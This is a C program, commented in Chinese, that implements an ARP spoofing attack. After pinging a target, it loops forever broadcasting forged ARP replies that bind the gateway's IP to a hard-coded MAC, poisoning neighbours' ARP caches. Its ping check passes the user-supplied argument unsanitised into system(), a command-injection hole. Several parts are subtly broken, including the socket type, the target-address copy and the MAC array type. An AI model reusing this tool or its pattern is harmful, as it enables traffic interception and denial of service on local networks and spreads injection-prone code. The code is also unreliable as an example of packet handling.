//基本C语言库，基本输入输出，字符串库
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//系统调用库
#include <unistd.h>
//IO操作库，ioctl()
#include <sys/ioctl.h>
//套接字库
#include <sys/socket.h>
//套接地址库, sockaddr_in, sockaddr_ll
#include <arpa/inet.h>

//用到的各种网络数据包库 
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <netpacket/packet.h>

unsigned char myip[4] = {192,168,158,2};
unsigned char gateway[4] = {192,168,158,1};
unsigned char mymac[6] = {0x00, 0x50, 0x50, 0x09, 0x00, 0x08};

void err_exit(const char *err_msg)
{
    perror(err_msg);
    exit(1);
}

struct arppkt
{
	struct ether_header eh;
	struct ether_arp arp;
};

struct sockaddr_in target;
int sockfd;

int checkip(const char *dst_ip)
{
	char temp[100];
	memset(temp,0,100);
	strcpy(temp,"ping -c2 ");
	strcat(temp,dst_ip);

	if(!system(temp))
	{
		printf("\n%s(%s)%s\n","Host",dst_ip,"is open.");
		return 1;
	}
	else
	{
		printf("\n%s(%s)%s\n","Host",dst_ip,"is close.");
		return 0;
	}
}

/* arp请求 */
void arp_request(const char *dst_ip)
{
	unsigned dst_mac_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	struct arppkt arp_packet;
	struct ifreq ifr;
	int ret_len,i = 0;
    
	sockfd = socket(AF_INET,SOCK_RAW,ETH_P_ARP);
	if(sockfd == -1)
		perror("socket()");
	memset(&target,0,sizeof(target));
	target.sin_family = AF_INET;
	target.sin_port = 0;
	target.sin_addr.s_addr = inet_addr(dst_ip);

    memcpy(arp_packet.eh.ether_shost, mymac, 6);
    memcpy(arp_packet.eh.ether_dhost, dst_mac_addr, 6);

    arp_packet.eh.ether_type = htons(ETHERTYPE_ARP);
    
	/* 整个arp包 */
    arp_packet.arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_packet.arp.ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_packet.arp.ea_hdr.ar_hln = 6;
    arp_packet.arp.ea_hdr.ar_pln = 4;
    arp_packet.arp.ea_hdr.ar_op = htons(ARPOP_REPLY);
    memcpy(arp_packet.arp.arp_sha, mymac, 6);
    memcpy(arp_packet.arp.arp_tha, dst_mac_addr, 6);
    memcpy(arp_packet.arp.arp_spa, gateway, 4);
    memcpy(arp_packet.arp.arp_tpa, dst_ip, 4);

	printf("=============================================\n");
    /* 发送请求 */
	while(1)
	{  
		ret_len = sendto(sockfd, &arp_packet, sizeof(arp_packet), 0, (struct sockaddr *)&target, sizeof(target));
		if ( ret_len > 0)
			printf("sendto() ok!!!\n");
		sleep(1);
	}

    close(sockfd);
}

int main(int argc, const char *argv[])
{

    if (argc != 2)
    {
        printf("usage:%s dst_ip\n", argv[0]);
        exit(1);
    }

	if(checkip(argv[1]) == 1)
	{
		arp_request(argv[1]);
		return 0;
	}
	else
		return 0;
}